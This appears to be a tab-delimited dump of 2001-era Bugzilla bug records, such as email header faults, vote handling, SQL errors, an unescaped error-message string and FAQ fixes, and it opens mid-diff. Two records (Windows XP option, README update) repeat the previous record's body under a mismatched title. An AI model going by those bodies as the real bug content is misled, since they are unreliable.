$Message_ID,"Bugzilla success (ID $id)", $reply ); 1282c1284 <     Reply( $SenderShort, $Message_ID, "Bugzilla Error", $errreply ); --- >     Reply( $EmailSender, $Message_ID, "Bugzilla Error", $errreply );
92500%TAB%996157486%TAB%32848%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Administration%TAB%OmniWeb browser "corrupts" params file with hard returns (^M),Bugzilla Bug, not Mozilla bug - OmniWeb browser "corrupts" params file with hard returns (^M),OmniWeb browser "corrupts" params file with hard returns (^M)%TAB%OmniWeb browser "corrupts" params file with hard returns (^M),Bugzilla Bug, not Mozilla bug - OmniWeb browser "corrupts" params file with hard returns (^M),OmniWeb browser "corrupts" params file with hard returns (^M)When updating parameters using the OmniWeb web browser for Mac OS X, the browser apparently submits hard returns (^M) instead of newlines for textarea stuff.  So for example, I get a hard returns in the newchangedmail headers after the "From:" header which makes sendmail (8.11.4) barf (it thinks there's no recipient)  See also bug report 89211 which helped me solve the error, and now I know where it's coming from.  Not sure if this is considered a browser bug or a Bugzilla bug, but it would be a quick fix to doeditparams.cgi to strip these out (looks like it's already translating \r\n to \n).
92515%TAB%996161463%TAB%5500%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Creating/Changing Bugs%TAB%Should be able to change resolution without re-opening...%TAB%Should be able to change resolution without re-opening...Quite often, users will use the wrong resolution when resolving a bug.  For example, using (FIXED instead of INVALID or WORKSFORME).  In order to change the resolution, I need to re-open and and re-resolve.  This generates two e-mails for nitpicking so I don't usually do it.    It should be possible to change the resolution without having to reopen. Possibly there could be a permission which controlled who had this privilege.
92552%TAB%996189454%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Creating/Changing Bugs%TAB%Separate out reassignment actions.%TAB%Separate out reassignment actions.We should separate out the reassignment actions from the standard status-changing actions.  Basically it should look like this.  ... < > Resolve bug, mark it as a duplicate ...  < > Don't change assignee < > Reassign bug to ... < > Reassign bug to default assignee of component  [ ] Reassign bug to default QA of component  Tell me again why assignee and QA work differently?  Sure, assignee has a real name for the existing value, and can't be blank, but I don't see why we can't just make the assignee like the QA contact and add a real name to the QA contact.  Or if you prefer, make the QA contact work like the assignee.  Then the above options would be consistent between the two.
92593%TAB%996223682%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Moving a bugs product removes all voters from the bug.%TAB%Moving a bugs product removes all voters from the bug.When you move a bug from one product to another, all the voters get removed from the bug.  While this is often necessary because otherwise you could exceed your vote limit per product, it is not always necessary.  Instead we could reduce people's votes to the highest value that:  (a) Means that the user's total vote count doesn't exceed what is allowed by the product. (b) Means that the user's bug vote count doesn't exceed what is allowed by the product (see also bug #28882).  Of course often this might mean we reduce it to 0, and hence we remove them from the bug.
92713%TAB%996334723%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%show_activity.cgi displays zeroes as non-breaking spaces%TAB%show_activity.cgi displays zeroes as non-breaking spacesWhen "show_activity.cgi" retrieves a list of changes from the database, it converts null values, empty strings, and zeroes to a non-breaking space ("&nbsp;"), presumably so the bug activity table formats correctly in browsers that format table cells differently if they contain no content.  Zeroes are content and are usually significant (they represent "boolean false" in certain fields), so they should not be converted to a non-breaking space.
92763%TAB%996432554%TAB%14877%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Administration%TAB%Add WinXP as OS selection for entering/searching bugs,Add Windows XP as OS selection for entering/searching bugs%TAB%Add WinXP as OS selection for entering/searching bugs,Add Windows XP as OS selection for entering/searching bugsWhen "show_activity.cgi" retrieves a list of changes from the database, it converts null values, empty strings, and zeroes to a non-breaking space ("&nbsp;"), presumably so the bug activity table formats correctly in browsers that format table cells differently if they contain no content.  Zeroes are content and are usually significant (they represent "boolean false" in certain fields), so they should not be converted to a non-breaking space.
92818%TAB%996485630%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%CHANGES file is hopelessly outdated%TAB%CHANGES file is hopelessly outdatedThe "CHANGES" file in the Bugzilla distribution has not been updated since 1999.  It should either be deleted or be redone with links to whereever it is we store this information nowadays (just like we updated the README file last milestone).
92905%TAB%996533021%TAB%31826%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Administration%TAB%editusers.cgi errors in apache errorlog: fetchrow_array failed%TAB%editusers.cgi errors in apache errorlog: fetchrow_array failedWhenever I edit a user (select a userentry from the list of users shown by a query to enter the user-edit page) I get this in the apache errorlog: DBD::mysql::st fetchrow_array failed: fetch() without execute() at globals.pl line 195. [Tue Jul 31 08:37:07 2001] editusers.cgi: DBD::mysql::st fetchrow_array failed: fetch() without execute() at globals.pl line 195. In my globals.pl it is this line: ------ sub MoreSQLData {     if (defined @::fetchahead) {     return 1;     } FAILS HERE->    if (@::fetchahead = $::currentquery->fetchrow_array) {     return 1;     }     return 0; } --------- I traced the problem to line 163 in editusers.cgi (the original 2.12 version) which looks like this:  while (MoreSQLData()) { The problems seems to be that this while comes just after an if like this: if (MoreSQLData()) { ... } while (MoreSQLData()) { ... It seems that MoreSQLData() gives this error if it is called twice when there is no more sqldata. So either the bug is that MoreSQLData does not support being called twice in this case, or the bug is that editusers.cgi does it. The problem occurs when the user is not a member of any isbuggroup groups. I solved the problem at my installation by putting the whileloop inside the if loop. I guess a more elegant solution would be to rewrite MoreSQLData so it supports being called repeatedly even if there is no more data, but I did not know how to do this.
93006%TAB%996586492%TAB%4657%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Query/Bug List%TAB%Changing several bug at once defaults to "Reassign" checkbox.%TAB%Changing several bug at once defaults to "Reassign" checkbox.1. Query bugzilla based on some conditions. 2. Click "Change several bugs at once link". 3. Select the drop down list box to resolve the bug to Wontfix.  Note that the  checkbox for Reassign is selected.
93037%TAB%996604389%TAB%5168%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Creating/Changing Bugs%TAB%Use ISO date format for attachment links (show_bug.cgi)%TAB%Use ISO date format for attachment links (show_bug.cgi)The Attachment links have a U.S. date format (MM/DD/YY). Please use the ISO International Standard format which is YYYY-MM-DD (already used elsewhere on the page.)  Thanks.
93110%TAB%996653500%TAB%5500%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Reporting/Charting%TAB%Should be able to click on user name in summary reports to get their list of bugs ,Should be able to click on user name in summary reports to get their list of bugs%TAB%Should be able to click on user name in summary reports to get their list of bugs ,Should be able to click on user name in summary reports to get their list of bugsIn the summary reports (e.g. Bug Counts), you should be able to click on a user name to get the appropriate query which will list all the bugs listed in the report.  That way we would be able to get details on which bugs that user was working on.
93167%TAB%996678988%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%&UserInGroup, &GroupExists, and &GroupIsActive should push and pop sql state,&GroupExists and &GroupIsActive should push and pop sql state%TAB%&UserInGroup, &GroupExists, and &GroupIsActive should push and pop sql state,&GroupExists and &GroupIsActive should push and pop sql state&UserInGroup, &GroupExists, and &GroupIsActive should push and pop sql state,  Those three functions do not call &PushGlobalSQLState or &PopGlobalSQLState, but they should in order "to avoid sometimes mysterious dataloss type bugs" according to a comment by Jake in bug 39816.
93388%TAB%996806328%TAB%32335%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,User Accounts%TAB%Full name should be trimmed of whitespace before going into database%TAB%Full name should be trimmed of whitespace before going into databaseIf you set your fullname as " " in prefs, then on all bugs you file there will be ------- Additional Comments From   2001-08-03 04:28 ------- or something similar.  See URL.  Whitespace should be trimmed before going into the database so it appears that nothing has been filled in for the name and the e-mail address is shown instead of a blank.
93511%TAB%996837659%TAB%5500%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Administration%TAB%Removing user screws up CC list.%TAB%Removing user screws up CC list.I removed a user that was CCed on a couple of bugs.  When I go back to that bug, the user is listed as __UNKNOWN__.  When I try and remove it, I get:  	The name __UNKNOWN__ is not a valid username. Either you misspelled it,	 	or the person has not registered for a Bugzilla account.   There's a few ways to fix this bug:  1. Allow removal of __UNKNOWN__ users from the CC list 2. Remove user from CC lists when it is deleted. 3. Prevent deleting user that is CCed to bugs.
93749%TAB%996982779%TAB%8444%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Creating/Changing Bugs,attachment and request management%TAB%Bugzilla tells me to `Create an Attachment' when I already did%TAB%Bugzilla tells me to `Create an Attachment' when I already didInstallation: bugzilla.mozilla.org  To reproduce: 1.  Make an attachment to a bug. 2.  Look at the (a) title and (b) heading of the resulting page.  What you see: (a) `Create an Attachment' (b) `Create an Attachment'  What you should see: (a) `Attachment added to bug xyz' (b) `<a href="...">Attachment abc</a> added to <a href="...">bug xyz</a>'
93751%TAB%996983462%TAB%8444%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,User Accounts,User Interface%TAB%Quit telling me about changing my prefs!%TAB%Quit telling me about changing my prefs!Installation: bugzilla.mozilla.org  To reproduce: 1.  Make a change to a bug, preferably a bug with lots of dependencies. 2.  Read the resulting page.  What you see: *   For every checked bug, the annoying text `If you wish to tweak the kinds of     mail Bugzilla sends you, you can <a href="...">change your preferences</a>'  What you should see: *   No such text.
93908%TAB%997074583%TAB%32839%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,User Interface%TAB%Remove the Reset button!%TAB%Remove the Reset button!Since the dawn of HTML/2.0 (or whenever the FORM tag appeared), people have been adding that worthless and destructive button next to the Submit button on EVERY form I see.  As the maintainer of RPGBoard, a message board script, it was one of the first things I removed, as the pain of clearing away an hour's worth of typing was enough to start bitching at the one who put the button there.  Let's start/continue a trend and remove it here!
94293%TAB%997241952%TAB%33524%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Email%TAB%Sendmail "from" header can not be configured in one config file,Sendmail "from" header can not be configured in one config file, From header broken in SMTP%TAB%Sendmail "from" header can not be configured in one config file,Sendmail "from" header can not be configured in one config file, From header broken in SMTPWhen you want to set the "from" item for the automatically sent emails one has  to change in different perl scripts:  e.g. in CGI.pl: Change  open SENDMAIL, "|/usr/lib/sendmail -t"; to  open SENDMAIL, "|/usr/lib/sendmail -t -f myemail@mydomain.com";  It would be nice to configure this globally.  Also the sendmail path (/usr/lib/sendmail) should be configured globally.
94303%TAB%997247667%TAB%15150%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Creating/Changing Bugs%TAB%Group together changes made at the same time in activity log%TAB%Group together changes made at the same time in activity logIt would be nice in the Activity Log for a bug, if some fields (i.e. who and when) could be grouped together (rowspan=X) for activities which all resulted from one change.
94534%TAB%997345613%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Administration%TAB%Customised resolutions.%TAB%Customised resolutions.We need to support custom resolutions, as well as the ability to make resolutions inactive.  I'm currently working on this.  My patch has enter_bug, query, show_bug, checksetup, etc all working ok, other parts not so good.  When I get a few more cycles I can probably get the patch to a stage where I will post it.  Basically in my implementation FIXED, MOVED and DUPLICATE are hardcoded (but renameable) because they're all special, everything else is up for grabs.
94618%TAB%997363438%TAB%32899%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%passwords with plus character don't work%TAB%passwords with plus character don't workWhen upgrading from 2.10 to 2.13, one user has a password with a  plus character.  This password did not work after upgrade. Reentering this password in editusers.cgi never gave an error, and the user was not able to log in.  Everything is fine if we use a password without a plus character.  This is probably related to the passwords previously being sent via GET method where spaces are mapped to plus.  url_decode of CGI.pl has a tr/+/ /, so I tried entering the password with space instead of + with little success.  I want to investigate more, but won't have time for several days, and believe the release is soon.
94846%TAB%997492787%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%README update.%TAB%README update.When upgrading from 2.10 to 2.13, one user has a password with a  plus character.  This password did not work after upgrade. Reentering this password in editusers.cgi never gave an error, and the user was not able to log in.  Everything is fine if we use a password without a plus character.  This is probably related to the passwords previously being sent via GET method where spaces are mapped to plus.  url_decode of CGI.pl has a tr/+/ /, so I tried entering the password with space instead of + with little success.  I want to investigate more, but won't have time for several days, and believe the release is soon.
94847%TAB%997493314%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Update web site.%TAB%Update web site.Update web site.  I am also the release notes guy as well as QA (currently implies that barnboy does RN).  Talks about getting CVS before it talks about stable tarballs.  We should be encouraging the use of stable versions of Bugzilla, so it should be talked about first.  Add comment to section about reporting a bug asking reporter to be detailed.  This was in the README - I ripped it out in bug #94846.
94850%TAB%997497897%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General,Incoming Email%TAB%Integrate bug_email into the main code.,Integrate bug_email into the main code. (inbound submission and reply)%TAB%Integrate bug_email into the main code.,Integrate bug_email into the main code. (inbound submission and reply)Besides the feature presently possible. I'd like to see: a) Allow product/component selection based on the "To:" address.    (We have only one product and a few compontents a     support-unix@ and support-win@ is easier than bugs@ + @product one +        @component unix b) Allow the automatical addition of the user to the database (it the account     doesn't exist yet). This would provide a simpler access for in-house support    and would be like Debian's bug tracking system (minus "reportbug") c) It should be possible to separate mailserver and webserver.    .procmailrc is run on the mailserver and    ConnectToDatabase(); has to be run on the bugzilla-webserver.
94930%TAB%997565886%TAB%33763%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Form Submission,Bugzilla,Bugzilla Helper,Bugzilla-General%TAB%bug summary rejected when using opera%TAB%bug summary rejected when using operaFrom Bugzilla Helper: User-Agent: Mozilla/5.0 (Windows; U; Win98; en-US; rv:0.9.3+) Gecko/20010809 BuildID:    2001080904  Using Opera 5.11, I tried to submit a bug with the following summary:  "read all about it" is misaligned  I got an error message saying "Your bug information is incomplete.  Please address the following issues: Summary: Please provide a more descriptive Summary."  I thought it might be thinking that the summary was too short, so I changed it to  "read all about it" is misaligned at royal chemistry society website  I still got the same error :(  Then I tried submitting the bug using Mozilla, with all of the same information, and it worked fine.  Reproducible: Didn't try Steps to Reproduce: 1. Try to report a bug using Opera 2. 3.  Actual Results:  Showed an error dialog, but luckily didn't clear the form  Expected Results:  Should have opened the advanced bug entry form, like it does when I use Mozilla  I understand that you might have a rivalry with Opera, but that's not a good first impression to make on someone looking for an alternative alternative browser.  Note: this doesn't seem to fit under "Browser or Editor", but I couldn't figure out how to file a bug about Bugzilla.
94949%TAB%997574474%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Documentation%TAB%Bugzilla FAQ contains empty section.%TAB%Bugzilla FAQ contains empty section.Bugzilla FAQ contains an empty section A.3.3.
94951%TAB%997575567%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Maintainers out of date.%TAB%Maintainers out of date.Section A.1.5 is out of date.
94952%TAB%997578920%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Bugzilla doesn't have longdescs.,Bugzilla doesn't have longdescs?%TAB%Bugzilla doesn't have longdescs.,Bugzilla doesn't have longdescs?A.3.1.  What about Loki Bugzilla?  Loki Games has a customized version of Bugzilla available at http://fenris.lokigames.com. From that page,  You may have noticed that Fenris is a fork from Bugzilla-- our patches weren't suitable for integration --and a few people have expressed interest in the code. Fenris has one major improvement over Bugzilla, and that is individual comments are not appended onto a string blob, they are stored as a record in a separate table. This allows you to, for instance, separate comments out according to privilege levels in case your bug database could contain sensitive information not for public eyes. We also provide things like email hiding to protect user's privacy, additional fields such as 'user_affected' in case someone enters someone else's bug, comment editing and deletion, and more conditional system variables than Bugzilla does (turn off attachments, qacontact, etc.).  --------------------------------  We've had the longdescs table which does this for ages now.  The presence of this statement implies we don't.
94953%TAB%997579171%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Documentation%TAB%You can add fields to Bugzilla?%TAB%You can add fields to Bugzilla?A.4.14.  Does Bugzilla allow fields to be added, changed or deleted? If I want to customize the bug submission form to meet our needs, can I do that using our terminology?  Yes.  -----------------------------  This is rather uninformative and potentially misleading.  It should say that you need to hack the code.  I thought I read a comment elsewhere about something similar where it did say this but I can't find it now.  Even better if it could include the recipe for how you modify the code to support new fields.  There is some information on this in the newsgroup.
95008%TAB%997620363%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%duplicates page should not ignore verified INVALID/WONTFIX bugs%TAB%duplicates page should not ignore verified INVALID/WONTFIX bugsThe duplicates.cgi page doesn't show VERIFIED bugs, so that old, now fixed bugs don't clutter up the table.  That makes sense for fixed bugs, but some bugs (eg alt tooltips not displaying, or junkbuster being broken (bug 38488)) are not really bugs, and so will never be fixed. That doesn't stop people reporting them again.  The duplicates page should list INVALID and WONTFIX bugs. Maybe only list those with new dupes in the last month or so?
95024%TAB%997631083%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Query/Bug List%TAB%Assignee/QA/Reporter/CC can't see restricted bugs in buglist%TAB%Assignee/QA/Reporter/CC can't see restricted bugs in buglistThis is an offshoot from bug 39816, which made it possible for the Assignee, QA, Reporter, and CC list to see a bug even if they were not a member of the group the bug was restricted to.  However, they can only see if it they know the bug number.  It still doesn't show up in their buglists.  The buglist needs to show these bugs to them also.
95060%TAB%997660817%TAB%15150%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,User Interface%TAB%votehelp.html could do with a bit of clarification%TAB%votehelp.html could do with a bit of clarification(I checked the latest cvs source before creating a bug this time :)  Anyway, the current votehelp.html says to use a 'Change yur password or preferences' link to review your votes, but this is wrong, as there is an explicit 'My Votes' link now.  (patch in a bit)
95082%TAB%997683467%TAB%4897%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Param('shutdownhtml') doesn't completely shut down Bugzilla%TAB%Param('shutdownhtml') doesn't completely shut down BugzillaEntering something into shutdownhtml doesn't completely disable Bugzilla as there are some queries that are run before bugzilla calls PutHeader() [which is where shutdownhtml takes effect].  This causes issues with the number of available connections when bugzilla is trying to do things like resync the shadow db.  Also, when bugzilla is shut down, you see all the normal page headers (FE, the last time bugzilla was shut down I was in the middle of making a change and the page header said that the bug was processed, but immediatly underneath that it said bugzilla was down).
95235%TAB%997764467%TAB%15150%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Insecure error message in buglist.cgi:SqlifyDate() ??,Insecure error message in buglist.cgi:SqlifyDate(),Insecure variables passed to DisplayError() from buglist.cgi%TAB%Insecure error message in buglist.cgi:SqlifyDate() ??,Insecure error message in buglist.cgi:SqlifyDate(),Insecure variables passed to DisplayError() from buglist.cgiApologies if this is a duplicate, but querying bugzilla is broken at the moment, so I can't check.  The SqlifyDate() routine has the following:  >>   if (!defined $date) { >>        PuntTryAgain("The string '<tt>$str</tt>' is not a legal date.");   Should there be either a html_quote(), or a value_quote() around the $str?
95304%TAB%997800771%TAB%5003%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%add a buglist link to the top of duplicates.cgi%TAB%add a buglist link to the top of duplicates.cgiIt would be really useful to be able to get the duplicates.cgi bugs into a buglist so I could add and sort by various other columns.
95381%TAB%997837721%TAB%33935%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Query/Bug List%TAB%Query on Added comment email address causes SQL error%TAB%Query on Added comment email address causes SQL errorSteps to reproduce:  1. Start a new query. 2. Enter some component of a valid email address (or even some garbage text) in  the Email field, deselect 'Assigned To' and select 'Added comment' 3. Submit  returns  Software error:  SELECT bugs.bug_id, bugs.groupset, substring(bugs.bug_severity, 1, 3), substring (bugs.priority, 1, 3), substring(bugs.rep_platform, 1, 3),  map_assigned_to.login_name, substring(bugs.bug_status,1,4), substring (bugs.resolution,1,4), substring(bugs.short_desc, 1, 60) FROM bugs, profiles  map_assigned_to, profiles map_reporter LEFT JOIN profiles map_qa_contact ON  bugs.qa_contact = map_qa_contact.userid, longdescs longdescs_ INNER JOIN  profiles longdescnames_ ON longdescs_.who = longdescnames_.userid WHERE  bugs.assigned_to = map_assigned_to.userid AND bugs.reporter =  map_reporter.userid AND bugs.groupset & 120 = bugs.groupset AND  longdescs_.bug_id = bugs.bug_id AND (bugs.bug_status = 'NEW' OR bugs.bug_status  = 'ASSIGNED' OR bugs.bug_status = 'REOPENED') AND (INSTR(LOWER (longdescnames_.login_name), 'hart')) GROUP BY bugs.bug_id ORDER BY  bugs.bug_status, bugs.priority, map_assigned_to.login_name, bugs.bug_id: You  have an error in your SQL syntax near 'INNER JOIN profiles longdescnames_ ON  longdescs_.who = longdescnames_.userid WHE' at line 1 at globals.pl line 205.
95426%TAB%997859732%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Remove $onebug cruft.%TAB%Remove $onebug cruft.There's code in editkeywords.cgi and queryhelp.cgi that works around an old bug in MySQL:      SendSQL("SELECT keyworddefs.id, keyworddefs.name, keyworddefs.description,                     COUNT(keywords.bug_id), keywords.bug_id              FROM keyworddefs LEFT JOIN keywords ON keyworddefs.id =                   keywords.keywordid              GROUP BY keyworddefs.id              ORDER BY keyworddefs.name");     while (MoreSQLData()) {         my ($id, $name, $description, $bugs, $onebug) = FetchSQLData(); 	...         if (!$onebug) {             # This is silly hackery for old versions of MySQL that seem to             # return a count() of 1 even if there are no matching.  So, we              # ask for an actual bug number.  If it can't find any bugs that             # match the keyword, then we set the count to be zero, ignoring             # what it had responded. 	...  I dont' think having workarounds for this is a good idea in the first place because it's liable to occur in other places and people won't remember to do the workaround.  So let's kill the code and update the MySQL version requirement.  This bug does not occur on landfill (v3.22.30) and I'm told mothra runs v3.22.32.  The main problem is we're not sure what version it was fixed in.  I can see various references to COUNT, but I suspect this is the fix:  3.21.22: FIX COUNT(*) problems when the WHERE clause didn't match any records. (Bug from 3.21.17.)  If this is the case, our current version check (which I'm told is 3.22.5) should already cover it.  But if we can't verify the fixed version, we could change the requirement to v3.22.30.
95430%TAB%997860707%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Creating/Changing Bugs%TAB%Reopening en masse fails.%TAB%Reopening en masse fails.There is an option for reopening on the bulk change page.  However it doesn't work.  It references the "id" parameter several times which does not exist for bulk changes.  It looks like this problem _may_ have been introduced during the duplicates table introduction, as there's some code there that references the duplicates table.  Or that just may have added more broken code.  This should be looping through @idlist or some such.  There's also similar code for mass duplicate marking.  Although this probably can't get called from the UI, it probably still can be called by entering a special URL.  It should be dealt with too.
95535%TAB%997894473%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Password reset issues tokens w/ "&" in them, URL not escaped%TAB%Password reset issues tokens w/ "&" in them, URL not escapedI requested a password reset on one of the landfill installs and got this:  (you'll have to ignore the fact that someone forgot to set the baseurl in editparams)  Notice that the token on the end of the URL contains a & in the token, and it didn't get escaped in the URL.  Date: Wed, 15 Aug 2001 18:26:16 -0700 From: bugzilla-daemon@landfill.tequilarista.org To: dave@intrec.com Subject: Bugzilla Change Password Request  You or someone impersonating you has requested to change your Bugzilla password.  To change your password, visit the following link:  http://cvs-mirror.mozilla.org/webtools/bugzilla/token.cgi?a=cfmpw&t=V&l*Cv0w  If you are not the person who made this request, or you wish to cancel this request, visit the following link:  http://cvs-mirror.mozilla.org/webtools/bugzilla/token.cgi?a=cxlpw&t=V&l*Cv0w
95564%TAB%997917422%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%buglist.cgi uses an INNER JOIN,buglist.cgi uses an INNER JOIN, not supported in MySQL 3.22.5%TAB%buglist.cgi uses an INNER JOIN,buglist.cgi uses an INNER JOIN, not supported in MySQL 3.22.5INNER JOINs are supported on mysql version 3.23.0 and up, and mysql version 3.23.17 and up supports the ANSI SQL syntax for this command.  Bugzilla, however, requires only mysql 3.22.5, so it should either not contain INNER JOINs or Bugzilla should require a newer version of mysql.  Requiring a newer version is a more complex issue that should probably involve, among other things, polling Bugzilla installations, so in the meantime I am attaching a patch to remove the INNER JOIN from buglist.cgi and replace it with an equivalent expression supported by all relevant versions of mysql.
95567%TAB%997918123%TAB%6793%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Creating/Changing Bugs%TAB%javascript strict warnings in enter_bug.cgi%TAB%javascript strict warnings in enter_bug.cgijust go to: http://bugzilla.mozilla.org/enter_bug.cgi?product=Webtools and press Commit and you get:  Warning: function onclick does not always return a value Source Code: if (this.form.short_desc.value =='') { alert('Please enter a summary sentence for this bug.'); return false; }
95594%TAB%997941734%TAB%1069%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Dependency loop detection - false positives!,Circular dependencies if depends and blocks set at same time%TAB%Dependency loop detection - false positives!,Circular dependencies if depends and blocks set at same timeI am trying to add myself to CC list of bug 95504. When I try to commit, I get "Dependency loop detected!" error message which is ridiculous since I haven't added any dependency, just changed the CC list.  So, either dependency loop already exists and was overlooked earlier or it does not exists and Bugzilla is just giving me a hard time without a reason.
95615%TAB%997949054%TAB%15150%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Creating/Changing Bugs%TAB%editvotes error:'u r using X votes', should be 'u r *TRYING* to use X votes'%TAB%editvotes error:'u r using X votes', should be 'u r *TRYING* to use X votes'Trivial suggestion that the error messages about using too many votes should say  'you are trying to use X', instead of   'you are using X'
95634%TAB%997954363%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Make voteremovedmail default cleaner.%TAB%Make voteremovedmail default cleaner.Jake made his voting changes so that administrators didn't need to change voteremovedmail, which is fine, but we can improve the default, as well as letting the administrator change the voteremovedmail to what they want.
95731%TAB%998001004%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%software error: "INSERT INTO shadowlog" fails because "Table 'shadowlog' was not locked"%TAB%software error: "INSERT INTO shadowlog" fails because "Table 'shadowlog' was not locked"Software error: INSERT INTO shadowlog (command) VALUES ('INSERT INTO tokens ( userid , issuedate , token , tokentype , eventdata ) VALUES ( 27300 , NOW() , \'5#Lp0!i6\' , \'password\' , \'63.192.202.253\' )'): Table 'shadowlog' was not locked with LOCK TABLES at globals.pl line 214.  Software error: INSERT INTO shadowlog (command) VALUES ('DELETE FROM tokens WHERE token = \'5#Lp0!i6\''): Table 'shadowlog' was not locked with LOCK TABLES at globals.pl line 214.  -----  It seems to happen only with the token code so far.
95732%TAB%998001777%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%logincookies.cryptpassword is 64 characters long,remove logincookies.cryptpassword%TAB%logincookies.cryptpassword is 64 characters long,remove logincookies.cryptpasswordprofiles.cryptpassword has changed to 34 characters.  logincookies.cryptpassword should do the same since they both store the same kinds of values.
95743%TAB%998009059%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%submitting changes with login unsets "roles" checkboxes%TAB%submitting changes with login unsets "roles" checkboxesSubmit a change while not logged in, then log in to an account with access to at least one bug group.  The "roles" checkboxes that govern whether or not the reporter, assignee, qa contact, and cc list can always see the bug get unset.  This is because process_bug assumes the user saw those checkboxes and unset them if the user has access to a bug group, but the user would not have seen those checkboxes if they were not logged in when initially viewing the bug.
95747%TAB%998009739%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%typoed CC fails to abort before changes are made%TAB%typoed CC fails to abort before changes are madewhen adding a CC to a bug, if you typo an address, it tells you "this@address isn't a bugzilla user.  Press Back and try again".  If you press back, and correct your address, when you hit commit, it midairs, because the rest of the changes you made to the bug applied anyway (but it didn't tell you they did).  The CC name to ID check needs to be run on the CC addresses before any changes are written to the database.
95759%TAB%998016041%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%localconfig.js contains strings of equals signs (===)%TAB%localconfig.js contains strings of equals signs (===)localconfig.js contains strings of equals signs (===), which can be misinterpreted as indicators of a conflict in the file when using grep to find files with conflicts in them.  Recommendation: use a different character to underline section headers.
95799%TAB%998034512%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Administration%TAB%Ssanity check should do checks in CheckEmailSyntax.,Sanity check should do checks in CheckEmailSyntax.%TAB%Ssanity check should do checks in CheckEmailSyntax.,Sanity check should do checks in CheckEmailSyntax.Sanity check should do more than just check emails against emailregexp.  It should check them against the extra checks done in CheckEmailSyntax.  See also bug #95798.
